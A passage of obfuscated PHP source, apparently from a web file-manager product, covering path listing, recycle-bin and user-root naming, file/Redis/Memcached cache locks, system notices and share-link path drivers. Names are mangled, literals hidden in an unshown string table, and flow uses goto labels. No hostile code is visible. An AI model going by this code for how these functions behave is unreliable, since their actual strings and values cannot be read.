$this->field($òÌß³şù[602])->where($»¤çª…)->select(); } if (!$èòÛÁ´) { $èòÛÁ´ = array(); } foreach ($èòÛÁ´ as $ïëÉ¯Ì‡) { $Òôèñ»ã[$ïëÉ¯Ì‡[$òÌß³şù[193]]] = $ïëÉ¯Ì‡[$òÌß³şù[32]]; } } $ÖáÉÂş© = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¤€Åá­Š = array(); foreach ($’şùü­ as &$«›Î®ş¢) { $»ıÑõúˆ = $«›Î®ş¢[$òÌß³şù[595]]; $Àà©Æ³ = $òÌß³şù[12]; if (isset($¤€Åá­Š[$»ıÑõúˆ])) { $Àà©Æ³ = $¤€Åá­Š[$»ıÑõúˆ]; } else { $¦¤¾’£Ó = $this->parentLevelArray($«›Î®ş¢[$òÌß³şù[595]]); foreach ($¦¤¾’£Ó as $¾ûÒØİ« => $·òàšŒ¹) { if (isset($Òôèñ»ã[$·òàšŒ¹])) { $Àà©Æ³ .= $Òôèñ»ã[$·òàšŒ¹] . $òÌß³şù[8]; } } $¤€Åá­Š[$»ıÑõúˆ] = $Àà©Æ³; } $Àà©Æ³ .= $«›Î®ş¢[$òÌß³şù[32]]; if ($«›Î®ş¢[$òÌß³şù[496]] == $òÌß³şù[91]) { $Àà©Æ³ .= $òÌß³şù[8]; } $«›Î®ş¢[$òÌß³şù[593]] = str_replace($òÌß³şù[256], $òÌß³şù[8], $Àà©Æ³); if ($«›Î®ş¢[$òÌß³şù[192]] == $òÌß³şù[230]) { $«›Î®ş¢[$òÌß³şù[32]] = trim($Òôèñ»ã[$«›Î®ş¢[$òÌß³şù[193]]], $òÌß³şù[8]); $«›Î®ş¢[$òÌß³şù[593]] = $«›Î®ş¢[$òÌß³şù[32]] . $òÌß³şù[8]; } if (intval($«›Î®ş¢[$òÌß³şù[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($«›Î®ş¢, $¦¤¾’£Ó, $ÖáÉÂş©); } } unset($«›Î®ş¢); return $’şùü­; } private function _listAppendPathRecycle(&$êş¯Æì, $Ñ¿¹³İÑ, $©›Ëã«) { $€§½Ö¾œ =& $_SERVER[´È¥ö†ö]; if (!in_array($©›Ëã«, $Ñ¿¹³İÑ) && $êş¯Æì[$€§½Ö¾œ[193]] != $©›Ëã«) { return; } $ô¹Šå’ = explode($€§½Ö¾œ[8], trim($êş¯Æì[$€§½Ö¾œ[593]], $€§½Ö¾œ[8])); $Ñõ„‘Å = implode($€§½Ö¾œ[8], array_slice($ô¹Šå’, 2)); $êş¯Æì[$€§½Ö¾œ[593]] = $€§½Ö¾œ[8] . LNG($€§½Ö¾œ[603]) . $€§½Ö¾œ[8] . ltrim($Ñõ„‘Å, $€§½Ö¾œ[8]); $êş¯Æì[$€§½Ö¾œ[595]] = $€§½Ö¾œ[604] . implode($€§½Ö¾œ[50], array_slice($Ñ¿¹³İÑ, 1)) . $€§½Ö¾œ[50]; if ($êş¯Æì[$€§½Ö¾œ[193]] == $©›Ëã«) { $êş¯Æì[$€§½Ö¾œ[595]] = $€§½Ö¾œ[604]; $êş¯Æì[$€§½Ö¾œ[192]] = $€§½Ö¾œ[230]; $êş¯Æì[$€§½Ö¾œ[32]] = LNG($€§½Ö¾œ[603]); } $êş¯Æì[$€§½Ö¾œ[605]] = $€§½Ö¾œ[606]; } protected function _listAppendPathRoot(&$ã ë»¬…, $ÏÔ•ÍæÓ) { $İçÉÚÊï =& $_SERVER[´È¥ö†ö]; static $û±Õ’« = false; static $®ÆèÙğü = false; $ê©‡©‰† = $İçÉÚÊï[12]; if ($ã ë»¬…[$İçÉÚÊï[190]] == self::TYPE_USER) { if ($ã ë»¬…[$İçÉÚÊï[580]] == USER_ID) { $ê©‡©‰† = LNG($İçÉÚÊï[607]); if ($û±Õ’« === !1) { $€È®ÕŞ§ = Model($İçÉÚÊï[608])->getInfoFull(USER_ID); $û±Õ’« = _get($€È®ÕŞ§, $İçÉÚÊï[609], $İçÉÚÊï[12]); } if ($®ÆèÙğü === !1) { $€È®ÕŞ§ = Model($İçÉÚÊï[608])->getInfoFull(USER_ID); $®ÆèÙğü = _get($€È®ÕŞ§, $İçÉÚÊï[610], $İçÉÚÊï[12]); } if ($ÏÔ•ÍæÓ && $ÏÔ•ÍæÓ[0] == $û±Õ’« || !$ÏÔ•ÍæÓ && $ã ë»¬…[$İçÉÚÊï[193]] == $û±Õ’«) { $ê©‡©‰† = LNG($İçÉÚÊï[611]); $ã ë»¬…[$İçÉÚÊï[612]] = $İçÉÚÊï[613]; } if ($ÏÔ•ÍæÓ && $ÏÔ•ÍæÓ[0] == $®ÆèÙğü || !$ÏÔ•ÍæÓ && $ã ë»¬…[$İçÉÚÊï[193]] == $®ÆèÙğü) { $ê©‡©‰† = $ê©‡©‰† . $İçÉÚÊï[614] . LNG($İçÉÚÊï[615]); } if (!$ÏÔ•ÍæÓ) { $ã ë»¬…[$İçÉÚÊï[32]] = $ê©‡©‰†; } } else { $€È®ÕŞ§ = Model($İçÉÚÊï[608])->getInfoFull($ã ë»¬…[$İçÉÚÊï[580]]); $š†Ášñ = _get($€È®ÕŞ§, $İçÉÚÊï[610], $İçÉÚÊï[12]); $ã ë»¬…[$İçÉÚÊï[616]] = Model($İçÉÚÊï[588])->getInfoSimpleOuter($ã ë»¬…[$İçÉÚÊï[580]]); $ê©‡©‰† = LNG($İçÉÚÊï[617]) . $İçÉÚÊï[176] . $ã ë»¬…[$İçÉÚÊï[616]][$İçÉÚÊï[32]] . $İçÉÚÊï[178]; if ($ÏÔ•ÍæÓ && $ÏÔ•ÍæÓ[0] == $š†Ášñ || !$ÏÔ•ÍæÓ && $ã ë»¬…[$İçÉÚÊï[193]] == $š†Ášñ) { $ê©‡©‰† = LNG($İçÉÚÊï[617]) . $İçÉÚÊï[618] . $ã ë»¬…[$İçÉÚÊï[616]][$İçÉÚÊï[32]] . $İçÉÚÊï[614] . LNG($İçÉÚÊï[615]) . $İçÉÚÊï[178]; } } } else { if ($ã ë»¬…[$İçÉÚÊï[190]] == self::TYPE_GROUP) { $¨¾”³õÛ = Model($İçÉÚÊï[596])->getInfoSimple($ã ë»¬…[$İçÉÚÊï[580]]); $ê©‡©‰† = $¨¾”³õÛ[$İçÉÚÊï[32]]; } else { if ($ã ë»¬…[$İçÉÚÊï[190]] == self::TYPE_SYSTEM) { $ê©‡©‰† = $İçÉÚÊï[619]; } } } $ê©‡©‰† = $ê©‡©‰† ? $İçÉÚÊï[8] . $ê©‡©‰† . $İçÉÚÊï[8] : $İçÉÚÊï[8]; return $ê©‡©‰†; } protected function _listAppendUser(&$Ûí’ÕïÉ) { $ãëæøä =& $_SERVER[´È¥ö†ö]; $°–ìõÅ = array_to_keyvalue($Ûí’ÕïÉ, $ãëæøä[12], $ãëæøä[538]); $àÙë¬Öú = array_to_keyvalue($Ûí’ÕïÉ, $ãëæøä[12], $ãëæøä[540]); $Ü¡«üİ¨ = array_merge($°–ìõÅ, $àÙë¬Öú); $š¼£‡æ¶ = Model($ãëæøä[608])->userListInfo($Ü¡«üİ¨); foreach ($Ûí’ÕïÉ as &$øÔÄ×Õİ) { $¤ßÍÈ© = $øÔÄ×Õİ[$ãëæøä[538]]; $øÔÄ×Õİ[$ãëæøä[538]] = $š¼£‡æ¶[$¤ßÍÈ©] ? $š¼£‡æ¶[$¤ßÍÈ©] : !1; $¤ßÍÈ© = $øÔÄ×Õİ[$ãëæøä[540]]; $øÔÄ×Õİ[$ãëæøä[540]] = $š¼£‡æ¶[$¤ßÍÈ©] ? $š¼£‡æ¶[$¤ßÍÈ©] : !1; if (_get($øÔÄ×Õİ, $ãëæøä[620], 0)) { $ªÛ‡ìÛ = $GLOBALS[$ãëæøä[6]][$ãëæøä[92]][$ãëæøä[621]]; if ($øÔÄ×Õİ[$ãëæøä[550]][$ãëæøä[622]] <= time() - $ªÛ‡ìÛ) { $this->metaSet($øÔÄ×Õİ[$ãëæøä[193]], $ãëæøä[623], null); $this->metaSet($øÔÄ×Õİ[$ãëæøä[193]], $ãëæøä[622], null); unset($øÔÄ×Õİ[$ãëæøä[550]][$ãëæøä[623]]); continue; } $¯ŞñÎÁå = $øÔÄ×Õİ[$ãëæøä[550]][$ãëæøä[623]]; $øÔÄ×Õİ[$ãëæøä[550]][$ãëæøä[624]] = Model($ãëæøä[608])->getInfoSimpleOuter($¯ŞñÎÁå); } } unset($øÔÄ×Õİ); } public function parentLevelArray($•Ó³¦‰ù) { $÷Ü­ùŞº =& $_SERVER[´È¥ö†ö]; $•Ó³¦‰ù = explode($÷Ü­ùŞº[50], trim($•Ó³¦‰ù, $÷Ü­ùŞº[50])); return array_remove_value($•Ó³¦‰ù, $÷Ü­ùŞº[230]); } public function listAll($Ø÷„ıÅè) { $¬¥¯ÍŞ =& $_SERVER[´È¥ö†ö]; $¬ç¥ñµè = $this->sourceInfo($Ø÷„ıÅè); $ï‰øÖ = array($¬¥¯ÍŞ[625] => array($¬¥¯ÍŞ[626], $¬ç¥ñµè[$¬¥¯ÍŞ[595]] . $Ø÷„ıÅè . $¬¥¯ÍŞ[627]), $¬¥¯ÍŞ[628] => 0); $ş¿ùøØ = $¬¥¯ÍŞ[629]; $¨‹ííÚå = "\x4c\x45\x46\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\154\x65\x20\146\x69\154\145\40\157\x6e\40\x73\x6f\x75\x72\143\x65\x2e\x66\151\154\145\x49\x44\40\75\40\146\151\154\145\x2e\x66\x69\154\145\x49\x44"; $»Âˆ°×ù = $this->alias($¬¥¯ÍŞ[530])->field($ş¿ùøØ)->where($ï‰øÖ)->join($¨‹ííÚå)->select(); $this->_listAppendAuth($»Âˆ°×ù); $this->_listAppendUser($»Âˆ°×ù); $this->_listAppendPath($»Âˆ°×ù); $»Âˆ°×ù = array_to_keyvalue($»Âˆ°×ù, $¬¥¯ÍŞ[193]); $½º‡Ù™ = "\57{$¬ç¥ñµè[$¬¥¯ÍŞ[32]]}\x2f"; $½º‡Ù™ = $½º‡Ù™ == $¬¥¯ÍŞ[256] ? $¬¥¯ÍŞ[8] : $½º‡Ù™; $³ß´ò÷ = array(); foreach ($»Âˆ°×ù as $Ìû¼Ã => $á±“Ä’·) { $ÀŠ©×Äé = $this->parentLevelArray($á±“Ä’·[$¬¥¯ÍŞ[595]]); array_shift($ÀŠ©×Äé); $·ÁéŠ¾¶ = $½º‡Ù™; for ($¶‚Ï‰ìó = 0; $¶‚Ï‰ìó < count($ÀŠ©×Äé); $¶‚Ï‰ìó++) { $·ÁéŠ¾¶ .= $»Âˆ°×ù[$ÀŠ©×Äé[$¶‚Ï‰ìó]][$¬¥¯ÍŞ[32]] . $¬¥¯ÍŞ[8]; } $·ÁéŠ¾¶ .= $á±“Ä’·[$¬¥¯ÍŞ[32]]; if ($á±“Ä’·[$¬¥¯ÍŞ[496]]) { $·ÁéŠ¾¶ .= $¬¥¯ÍŞ[8]; } $“Ğ„ÍŸ = array($¬¥¯ÍŞ[506] => str_replace($¬¥¯ÍŞ[256], $¬¥¯ÍŞ[8], str_replace($¬¥¯ÍŞ[256], $¬¥¯ÍŞ[8], str_replace($¬¥¯ÍŞ[256], $¬¥¯ÍŞ[8], $·ÁéŠ¾¶))), $¬¥¯ÍŞ[630] => intval($á±“Ä’·[$¬¥¯ÍŞ[496]]), $¬¥¯ÍŞ[631] => intval($á±“Ä’·[$¬¥¯ÍŞ[79]]), $¬¥¯ÍŞ[88] => intval($á±“Ä’·[$¬¥¯ÍŞ[88]]), $¬¥¯ÍŞ[90] => $this->pathInfoFilter($á±“Ä’·)); if (!$“Ğ„ÍŸ[$¬¥¯ÍŞ[496]]) { $“Ğ„ÍŸ[$¬¥¯ÍŞ[552]] = $á±“Ä’·[$¬¥¯ÍŞ[552]]; } $³ß´ò÷[] = $“Ğ„ÍŸ; } $³ß´ò÷ = array_sort_by($³ß´ò÷, $¬¥¯ÍŞ[87]); return $³ß´ò÷; } } goto aù»±ŒÕ; cŠ–¼¯ë: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¯¯ş¤õö =& $_SERVER[´È¥ö†ö]; $µâ½˜­¤ = $GLOBALS[$¯¯ş¤õö[6]][$¯¯ş¤õö[435]]; self::$cachePath = $µâ½˜­¤[$¯¯ş¤õö[232]][$¯¯ş¤õö[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¡Â…ãÆÁ, $€çÌ”ÑŞ = 0) { $³‘õÖ¤Ô =& $_SERVER[´È¥ö†ö]; $¾½Ğ©âğ = microtime(!0); $çÎ¸çÑ = $¾½Ğ©âğ + $€çÌ”ÑŞ + 0.0001; $ó—İ“şé = rtrim(self::$cachePath, $³‘õÖ¤Ô[8]) . $³‘õÖ¤Ô[941] . md5($¡Â…ãÆÁ) . $³‘õÖ¤Ô[938]; if (file_exists($ó—İ“şé) && filemtime($ó—İ“şé) && filemtime($ó—İ“şé) < time() - 10) { @unlink($ó—İ“şé); } do { if (file_exists($ó—İ“şé)) { cacheLockWait(); continue; } $ı³çÉá· = fopen($ó—İ“şé, $³‘õÖ¤Ô[942]); if (!$ı³çÉá·) { return !1; } $üÖüÈë× = flock($ı³çÉá·, LOCK_EX | LOCK_NB); self::$caches[$¡Â…ãÆÁ] = array($³‘õÖ¤Ô[943] => $ı³çÉá·, $³‘õÖ¤Ô[232] => $ó—İ“şé); fwrite($ı³çÉá·, $çÎ¸çÑ); clearstatcache(); if ($ı³çÉá· && $üÖüÈë×) { return !0; } cacheLockWait(); } while (microtime(!0) < $çÎ¸çÑ); $this->unlock($¡Â…ãÆÁ); return !1; } public function lockGet($»õ¸…ªö) { $ •ÜĞÇ· =& $_SERVER[´È¥ö†ö]; $Œ æâˆš = rtrim(self::$cachePath, $ •ÜĞÇ·[8]) . $ •ÜĞÇ·[941] . md5($»õ¸…ªö) . $ •ÜĞÇ·[938]; return file_exists($Œ æâˆš); } public function unlock($üóïêî“) { $ÛÌºØÂ¦ =& $_SERVER[´È¥ö†ö]; $ßšÛ’Ñí = self::$caches[$üóïêî“]; if (!$ßšÛ’Ñí) { return; } @flock($ßšÛ’Ñí[$ÛÌºØÂ¦[943]], LOCK_UN); @fclose($ßšÛ’Ñí[$ÛÌºØÂ¦[943]]); @unlink($ßšÛ’Ñí[$ÛÌºØÂ¦[232]]); unset(self::$caches[$üóïêî“]); } } class CacheLockRedis { public function lock($µ¶™›óÔ, $¢¢Øûê = 10) { $úêŒ§¦ = Cache::init(); $Ğ³±á’¹ = microtime(!0) + $¢¢Øûê; while (microtime(!0) < $Ğ³±á’¹) { $ÜÍ–”½Ë = $úêŒ§¦->get($µ¶™›óÔ); if (!$ÜÍ–”½Ë) { $üÖİÀ™® = $úêŒ§¦->setLock($µ¶™›óÔ, $Ğ³±á’¹, $¢¢Øûê); if ($üÖİÀ™®) { return !0; } } else { if ($ÜÍ–”½Ë < microtime(!0)) { $úêŒ§¦->set($µ¶™›óÔ, $Ğ³±á’¹, $¢¢Øûê * 2); if ($úêŒ§¦->get($µ¶™›óÔ) === $ÜÍ–”½Ë) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($óÅ®­È³) { return Cache::init()->get($óÅ®­È³); } public function unlock($‡÷Ş­•ø) { return Cache::init()->remove($‡÷Ş­•ø); } } goto AÑÏ†Çíä›; eÁÍİ‰ö : class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x6e\x6f\164\x69\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\x6e\x74\x65\x6e\x74", "\x61\x75\x74\x68", "\155\x6f\x64\x65", "\x74\151\155\x65", "\164\x79\160\x65", "\x6c\x65\166\145\x6c", "\145\x6e\x61\x62\x6c\x65", "\163\157\x72\164"); public function listData($ÈÏ üˆá = false, $²–¹ë Ã = "\x73\x6f\162\x74", $ã¥¬Ê¾ó = false) { return parent::listData($ÈÏ üˆá, $²–¹ë Ã, $ã¥¬Ê¾ó); } public function add($À·åÖ¬è) { $üŞòõ„ =& $_SERVER[´È¥ö†ö]; $å¬«•¯á = time(); if ($À·åÖ¬è[$üŞòõ„[16]] == $üŞòõ„[2445]) { $å¬«•¯á = strtotime($À·åÖ¬è[$üŞòõ„[206]]); } $À·åÖ¬è[$üŞòõ„[206]] = $å¬«•¯á; return parent::insert($À·åÖ¬è); } public function update($õ¨û¾šÃ, $ï®Ø€‰æ) { $‡ËÁ±è =& $_SERVER[´È¥ö†ö]; $á¢¹éšé = $this->listData($õ¨û¾šÃ); if (!$á¢¹éšé) { return !1; } $‘İÓ = time(); if ($ï®Ø€‰æ[$‡ËÁ±è[16]] == $‡ËÁ±è[2445]) { $‘İÓ = strtotime($ï®Ø€‰æ[$‡ËÁ±è[206]]); } $ï®Ø€‰æ[$‡ËÁ±è[206]] = $‘İÓ; return parent::update($õ¨û¾šÃ, $ï®Ø€‰æ); } public function remove($Û‰¹¿ü) { $ÍÀö®”¯ = $this->listData($Û‰¹¿ü); if (!$ÍÀö®”¯ || $ÍÀö®”¯[$_SERVER[´È¥ö†ö][191]]) { return !1; } return parent::remove($Û‰¹¿ü); } public function sort($Ä¾òÛÆè, $Â†åûí) { return parent::update($Ä¾òÛÆè, $Â†åûí); } public function enable($º¿¼ìÆ², $ÊŠäéÒâ) { return parent::update($º¿¼ìÆ², array($_SERVER[´È¥ö†ö][2446] => $ÊŠäéÒâ)); } private function initUserOption() { $º”†ùò =& $_SERVER[´È¥ö†ö]; $this->optionType = $º”†ùò[2447]; $this->modelType = $º”†ùò[2448]; $this->field = array($º”†ùò[2449], $º”†ùò[32], $º”†ùò[206], $º”†ùò[33], $º”†ùò[2450], $º”†ùò[826], $º”†ùò[228]); } public function userNoticeGet($’œ™™‰Œ = false) { $this->initUserOption(); return parent::listData($’œ™™‰Œ, $_SERVER[´È¥ö†ö][486], !0); } public function userNoticeAdd($ß¨“Ø¾ø) { $œ×…ùÊ¶ =& $_SERVER[´È¥ö†ö]; $this->initUserOption(); $¢Áª×ÒÈ = $this->findByKey($œ×…ùÊ¶[2449], $ß¨“Ø¾ø[$œ×…ùÊ¶[486]]); if ($¢Áª×ÒÈ) { return !0; } $Ó»èÔï = array($œ×…ùÊ¶[2449] => $ß¨“Ø¾ø[$œ×…ùÊ¶[486]], $œ×…ùÊ¶[32] => $ß¨“Ø¾ø[$œ×…ùÊ¶[32]], $œ×…ùÊ¶[206] => $ß¨“Ø¾ø[$œ×…ùÊ¶[206]], $œ×…ùÊ¶[33] => isset($ß¨“Ø¾ø[$œ×…ùÊ¶[33]]) ? $ß¨“Ø¾ø[$œ×…ùÊ¶[33]] : 1, $œ×…ùÊ¶[2450] => isset($ß¨“Ø¾ø[$œ×…ùÊ¶[2450]]) ? $ß¨“Ø¾ø[$œ×…ùÊ¶[2450]] : 0, $œ×…ùÊ¶[826] => 0, $œ×…ùÊ¶[228] => 0); return parent::insert($Ó»èÔï); } public function userNoticeEdit($¬³·ÍÏ°, $îÀíá¡Ğ) { $this->initUserOption(); return parent::update($¬³·ÍÏ°, $îÀíá¡Ğ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\x5f\x6f\x70\164\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\157\154\x65", "\162\157\154\145\x47\x72\157\165\160", "\x72\145\x67\x69\163\164", "\x65\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($£Ş‡Å¶) { return "\x53\171\x73\x74\x65\155\117\x70\x74\151\157\x6e\137{$£Ş‡Å¶}"; } protected function optionDefault($ß¾Ş±ªÍ = '') { $íĞãÛß =& $_SERVER[´È¥ö†ö]; if ($ß¾Ş±ªÍ == $íĞãÛß[12]) { return $GLOBALS[$íĞãÛß[6]][$íĞãÛß[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto eİ¼®Å‹â®; cËÖ„îàËÙ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($×Ö­½ò) { $this->pathParse = $×Ö­½ò; $this->model = Model($_SERVER[´È¥ö†ö][1420]); } protected function infoParse($úœĞ¿´ù, $òšÉ¨†ï = false, $¦üİæ¥ = false) { $üÜ€’Òè =& $_SERVER[´È¥ö†ö]; return Action($üÜ€’Òè[1255])->sharePathInfo($this->pathParse[$üÜ€’Òè[87]], !0, $òšÉ¨†ï); } public function listPath($©Ø¼ùÖò, $ŞµÅ˜Æú = false) { $Ü¢…®ÔÀ =& $_SERVER[´È¥ö†ö]; $¼Õ£ïûİ = parent::listPath($©Ø¼ùÖò, $ŞµÅ˜Æú); if (!$¼Õ£ïûİ) { return $¼Õ£ïûİ; } if (is_array($¼Õ£ïûİ[$Ü¢…®ÔÀ[1428]])) { $¼Õ£ïûİ[$Ü¢…®ÔÀ[1428]] = Action($Ü¢…®ÔÀ[1255])->shareItemInfo($¼Õ£ïûİ[$Ü¢…®ÔÀ[1428]]); } foreach ($¼Õ£ïûİ as $«‘ÍŸ›ü => $ÀÕŸ£¨‡) { if (!in_array($«‘ÍŸ›ü, array($Ü¢…®ÔÀ[86], $Ü¢…®ÔÀ[85]))) { continue; } foreach ($ÀÕŸ£¨‡ as $îÊ¢ÄÅÔ => $Ë±Õ¹«³) { $¼Õ£ïûİ[$«‘ÍŸ›ü][$îÊ¢ÄÅÔ] = Action($Ü¢…®ÔÀ[1255])->shareItemInfo($Ë±Õ¹«³); } } return $¼Õ£ïûİ; } public function listAll($Å·­‡Ş†) { $“”¬˜¯ =& $_SERVER[´È¥ö†ö]; $®°«üõ = IO::info($this->pathParse[$“”¬˜¯[87]]); if (!$®°«üõ) { return array(); } $èæÆÛš = $this->model->listAll($Å·­‡Ş†); foreach ($èæÆÛš as &$çÃ¥İ£î) { $çÃ¥İ£î[$“”¬˜¯[90]] = Action($“”¬˜¯[1255])->shareItemInfo($çÃ¥İ£î[$“”¬˜¯[90]]); } unset($çÃ¥İ£î); return $èæÆÛš; } } class PathDriverDriverShareItem { public function __construct($§Ãª†­) { $this->pathParse = $§Ãª†­; } public function __call($Æ™«»ùä, $¬°ñî¨É) { $’Ï¿É¸Á =& $_SERVER[´È¥ö†ö]; if (method_exists($this, $Æ™«»ùä)) { return; } $Úí¢×¤ = call_user_func_array(array($’Ï¿É¸Á[1429], $Æ™«»ùä), $¬°ñî¨É); $«Ù¯Ô”Ó = array($’Ï¿É¸Á[1430], $’Ï¿É¸Á[1431], $’Ï¿É¸Á[1432], $’Ï¿É¸Á[1433], $’Ï¿É¸Á[632], $’Ï¿É¸Á[634], $’Ï¿É¸Á[1434], $’Ï¿É¸Á[110], $’Ï¿É¸Á[1435], $’Ï¿É¸Á[1436]); if (in_array($Æ™«»ùä, $«Ù¯Ô”Ó)) { $Úí¢×¤ = $this->getPathOuter($Úí¢×¤); } return $Úí¢×¤; } public function copy($“±û’ƒß, $…ş»á—Ë, $»‹´ÜÂ = false, $ùâ›³Ó = false) { return $this->copyMove($“±û’ƒß, $…ş»á—Ë, $»‹´ÜÂ, $_SERVER[´È¥ö†ö][632], $ùâ›³Ó); } public function move($©Ó®«ìş, $¥äÜÑ¥Ş, $¦—’Ü•Õ = false, $şĞßô×€ = false) { return $this->copyMove($©Ó®«ìş, $¥äÜÑ¥Ş, $¦—’Ü•Õ, $_SERVER[´È¥ö†ö][634], $şĞßô×€); } private function copyMove($ı¼›©†Ã, $ıøëÎá÷, $¦æ³½¹®, $ó…»”ÂÒ, $øÜ—¯ÇÙ = false) { $¢·¢šª =& $_SERVER[´È¥ö†ö]; $Úê¨¢áå = $ıøëÎá÷; $ŸàÆÈ™ƒ = IO::driverMake($ıøëÎá÷); if ($ŸàÆÈ™ƒ->pathParse[$¢·¢šª[1231]]) { $ıøëÎá÷ = $ŸàÆÈ™ƒ->pathParse[$¢·¢šª[1231]]; } else { $ıøëÎá÷ = $Úê¨¢áå; } $Â®Ùå¶ô = IO::copyMove($ı¼›©†Ã, $ıøëÎá÷, $¦æ³½¹®, $ó…»”ÂÒ, $øÜ—¯ÇÙ); $Â®Ùå¶ô = $this->getPathOuter($Â®Ùå¶ô); return $Â®Ùå¶ô; } public function pathThis($Ô¢¿õü) { return get_path_this($this->pathParse[$_SERVER[´È¥ö†ö][87]]); } public function pathFather($ó…¾·ôÆ) { return get_path_father($this->pathParse[$_SERVER[´È¥ö†ö][87]]); } public function iconvSystem($›…Ëóñ») { return $›…Ëóñ»; } protected function infoParse($Î ¥é®, $«ĞÈÂÁŸ = false) { $…ôŸÎ° =& $_SERVER[´È¥ö†ö]; $òÛ½ÍëÒ = $this->pathParse[$…ôŸÎ°[571]][$…ôŸÎ°[1256]] . $this->pathParse[$…ôŸÎ°[1249]]; if ($«ĞÈÂÁŸ) { $Ó„ó½Ÿ­ = IO::infoWithChildren($òÛ½ÍëÒ); } else { $Ó„ó½Ÿ­ = IO::info($òÛ½ÍëÒ); } $¼…¯¢†Ÿ = $this->pathParse[$…ôŸÎ°[571]]; return Action($…ôŸÎ°[1427])->_shareItemeParse($Ó„ó½Ÿ­, $¼…¯¢†Ÿ); } public function listAll($íÉÁµ™õ) { $šİÕÙ¶ =& $_SERVER[´È¥ö†ö]; $¦¯í’Üì = IO::listAll($íÉÁµ™õ); $¶–¼‚·· = rtrim($this->pathParse[$šİÕÙ¶[571]][$šİÕÙ¶[1256]], $šİÕÙ¶[8]); foreach ($¦¯í’Üì as &$«’™Ê®Ô) { $«’™Ê®Ô[$šİÕÙ¶[87]] = $this->pathDriver . $šİÕÙ¶[8] . ltrim(substr($«’™Ê®Ô[$šİÕÙ¶[87]], strlen($¶–¼‚··)), $šİÕÙ¶[8]); } unset($«’™Ê®Ô); return $¦¯í’Üì; } public function listAllSimple($‹à†Ü¡, $ÇØï—È = false) { $ÒÕ‰¢æì =& $_SERVER[´È¥ö†ö]; $â†¯î½Ø = $this->listAll($‹à†Ü¡); $–İòª°„ = $this->pathParse[$ÒÕ‰¢æì[506]]; if (trim($–İòª°„, $ÒÕ‰¢æì[8]) == trim(get_path_father($–İòª°„), $ÒÕ‰¢æì[8])) { $ÇØï—È = !0; } return IO::init($ÒÕ‰¢æì[12])->listAllSimpleMake($â†¯î½Ø, $–İòª°„, $ÇØï—È); } public function getPathOuter($°²âş¯¯) { $¥¾ç²Ì† =& $_SERVER[´È¥ö†ö]; $•µ”§ß = KodIO::parse($°²âş¯¯); if ($•µ”§ß[$¥¾ç²Ì†[33]] == KodIO::KOD_SHARE_ITEM) { return $•µ”§ß[$¥¾ç²Ì†[87]]; } $á÷ñìå‰ = KodIO::clear($°²âş¯¯); $„˜Á…±  = KodIO::clear($this->pathParse[$¥¾ç²Ì†[571]][$¥¾ç²Ì†[1256]]); $Ääıõ‘Õ = substr($á÷ñìå‰, strlen($„˜Á…± )); if (substr($á÷ñìå‰, 0, strlen($„˜Á…± )) != $„˜Á…± ) { return !1; } return $this->pathParse[$¥¾ç²Ì†[1250]] . $¥¾ç²Ì†[8] . ltrim($Ääıõ‘Õ, $¥¾ç²Ì†[8]); } public function getType() { $ÀªÄÀ¤Í =& $_SERVER[´È¥ö†ö]; $Ó÷Å°²Ø = str_replace($ÀªÄÀ¤Í[77], $ÀªÄÀ¤Í[12], get_class($this)); return strtolower($Ó÷Å°²Ø); } public function isOsDriver($¶‚Á¸ÅÉ) { return IO::isOsDriver($¶‚Á¸ÅÉ); } public function info($¶Ô€¼ÀÂ) { return $this->infoParse($¶Ô€¼ÀÂ); } public function infoAuth($Û³×Šˆ½) { return $this->infoParse($Û³×Šˆ½); } public function infoWithChildren($î’ÕÒÛø) { return $this->infoParse($î’ÕÒÛø, !0); } public function infoFull($±“Úá¬­) { return $this->infoParse($±“Úá¬­); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ûèß¢Ù¼) { $this->pathParse = $ûèß¢Ù¼; } protected function infoParse($ßšË†™Ó, $ï¸­”¦Œ = false) { $€Š‚¥ƒı =& $_SERVER[´È¥ö†ö]; return Action($€Š‚¥ƒı[1255])->sharePathInfo($this->pathParse[$€Š‚¥ƒı[87]], !0, $ï¸­”¦Œ); } public function listPath($Ææôñ¸Ë, $Ì÷âÆ¨Å = false) { $‘ÇÍ˜” =& $_SERVER[´È¥ö†ö]; $Ö§Ë¤‰¦ = IO::listPath($Ææôñ¸Ë, $Ì÷âÆ¨Å); if (!$Ö§Ë¤‰¦) { return $Ö§Ë¤‰¦; } if (is_array($Ö§Ë¤‰¦[$‘ÇÍ˜”[1428]])) { $¤«ˆ¦‹è = Action($‘ÇÍ˜”[1437])->parsePathChildren($Ö§Ë¤‰¦[$‘ÇÍ˜”[1428]], array($‘ÇÍ˜”[506] => $Ææôñ¸Ë)); $Ö§Ë¤‰¦[$‘ÇÍ˜”[1428]] = Action($‘ÇÍ˜”[1255])->shareItemInfo($¤«ˆ¦‹è); } foreach ($Ö§Ë¤‰¦ as $“ï·ß€ï => $áòïË»•) { if (!in_array($“ï·ß€ï, array($‘ÇÍ˜”[86], $‘ÇÍ˜”[85]))) { continue; } foreach ($áòïË»• as $­·Å§Ì => $¤«ˆ¦‹è) { $¤«ˆ¦‹è = Action($‘ÇÍ˜”[1437])->parsePathChildren($¤«ˆ¦‹è, array($‘ÇÍ˜”[506] => $Ææôñ¸Ë)); $Ö§Ë¤‰¦[$“ï·ß€ï][$­·Å§Ì] = Action($‘ÇÍ˜”[1255])->shareItemInfo($¤«ˆ¦‹è); } } return $Ö§Ë¤‰¦; } } goto aìÈìŞ¾Î; AÑÏ†Çíä›: class CacheLockMemcached { public function lock($Ü”ÕØÂÖ, $¬ù±§ãÔ = 0) { $¦½Ò’‚Ö = Cache::init(); $üÚü’ˆæ = microtime(!0) 